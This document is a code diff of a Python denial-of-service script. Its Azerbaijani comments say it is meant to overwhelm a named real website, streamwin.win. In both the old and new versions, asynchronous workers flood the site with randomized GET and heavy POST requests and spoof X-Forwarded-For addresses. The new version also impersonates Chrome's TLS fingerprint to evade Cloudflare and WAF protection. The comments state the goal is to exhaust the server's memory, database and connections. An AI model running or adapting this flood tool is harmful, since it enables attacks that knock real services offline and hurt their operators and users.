@@ -1,79 +1,55 @@
 import asyncio
-import httpx
+from curl_cffi.requests import AsyncSession
 import random
 import string
 import time
 
-# --- MAXIMUM POWER CONFIGURATION ---
 TARGET_URL = "https://streamwin.win"
-WORKERS = 150           # Railway RAM-ı sona qədər zorlayır
-BATCH_SIZE = 100        # Hər worker eyni anda 100 "ölümcül" stream açır
-DATA_LOAD = 2048        # Hər POST-da serverə göndərilən ağır yük (Kb-larla)
+WORKERS = 60 # curl_cffi daha ağırdır, 60 worker kifayət edir
+BATCH = 30   # Hər worker eyni anda 30 sürətli və gizli stream açır
 
 def r_str(n):
-    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))
+    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))
 
-async def atom_strike(worker_id, client):
-    print(f"☢️  WARHEAD {worker_id} ARMED AND READY!")
-    
-    # Cloudflare və WAF-ı içəridən yormaq üçün "zibil" başlıqlar
-    headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
-        "Accept": "*/*",
-        "Accept-Encoding": "gzip, deflate, br, zstd",
-        "Content-Type": "application/json",
-        "X-Requested-With": "XMLHttpRequest",
-        "Cache-Control": "no-cache, no-store, must-revalidate",
-        "Pragma": "no-cache"
-    }
-
-    while True:
-        try:
-            # Serverin daxili axtarış motoruna (Database) və ağır API-lərinə müraciət
-            # Bu müraciət serveri hər dəfə sıfırdan hesablama aparmağa məcbur edir
-            url = f"{TARGET_URL}/?q={r_str(40)}&filter={r_str(60)}&id={random.getrandbits(32)}"
-            
-            tasks = []
-            for _ in range(BATCH_SIZE):
-                h = headers.copy()
-                # Saxta IP spamiləri
-                ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
-                h["X-Forwarded-For"] = ip
-                h["X-Real-IP"] = ip
+async def terminator_strike(worker_id):
+    # curl_cffi brauzeri TLS səviyyəsində təqlid edir (JA3 Bypass)
+    async with AsyncSession(impersonate="chrome124", http2=True, verify=False) as s:
+        print(f"💀 TERMINATOR Worker {worker_id} - CLOUDFLARE BYPASSED!")
+        
+        while True:
+            try:
+                # Ağır URL-lər (Axtarış bölmələri, API-lər)
+                url = f"{TARGET_URL}/?s={r_str(30)}&v={time.time()}&id={random.getrandbits(32)}"
                 
-                # AĞIR POST: Serverin RAM və Database yaddaşını dərhal kilitləyir
-                if _ % 2 == 0:
-                    heavy_json = {r_str(10): r_str(DATA_LOAD) for _ in range(20)}
-                    tasks.append(client.post(url, headers=h, json=heavy_json))
-                # SÜRATLİ GET: Şəbəkə portlarını (TCP Sockets) bağlayır
-                else: 
-                    tasks.append(client.get(url, headers=h))
+                headers = {
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+                    "Accept-Encoding": "gzip, deflate, br, zstd",
+                    "Accept-Language": "en-US,en;q=0.9",
+                    "Cache-Control": "no-cache",
+                    "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,254)}",
+                    "X-Requested-With": "XMLHttpRequest"
+                }
 
-            # Bütün asinxron "başlıqları" eyni anda serverin üzərinə burax!
-            await asyncio.gather(*tasks, return_exceptions=True)
-            
-            # NO DELAY: Serverin nəfəs almasına və bağlantıları təmizləməsinə İMKAN VERMƏ
-            await asyncio.sleep(0.0001)
-
-        except Exception:
-            await asyncio.sleep(0.1)
+                tasks = []
+                for _ in range(BATCH):
+                    # Saytın daxili elementlərini hədəf alan POST və GET qarışığı
+                    if _ % 3 == 0:
+                        tasks.append(s.post(url, headers=headers, json={"search": r_str(500), "filter": "all"}))
+                    else:
+                        tasks.append(s.get(url, headers=headers))
+                
+                # Sorğuları paralel olaraq serverə çırpırıq
+                await asyncio.gather(*tasks, return_exceptions=True)
+                
+            except Exception:
+                await asyncio.sleep(0.01)
 
 async def main():
-    print(f"💀 GLOBAL DEVASTATION MODE: {TARGET_URL}")
-    print("[!] WARNING: This will saturate the target server to the breaking point.")
+    print(f"💀 TERMINATOR MODE ACTIVE: {TARGET_URL}")
+    print("[!] Mimicking Chrome 124 TLS Fingerprint...")
     
-    # TCP hüdudlarını və bağlantı limitlərini tamamilə ləğv edirik
-    limits = httpx.Limits(max_connections=None, max_keepalive_connections=None)
-    
-    async with httpx.AsyncClient(
-        http2=True,          # HTTP/2 Rapid Reset effekti (MÜTLƏQDİR)
-        verify=False, 
-        limits=limits, 
-        timeout=8.0          # Server donanda bağlantını tutub saxlamaq üçün
-    ) as client:
-        
-        workers = [atom_strike(i, client) for i in range(WORKERS)]
-        await asyncio.gather(*workers)
+    workers = [terminator_strike(i) for i in range(WORKERS)]
+    await asyncio.gather(*workers)
 
 if __name__ == "__main__":
     asyncio.run(main())
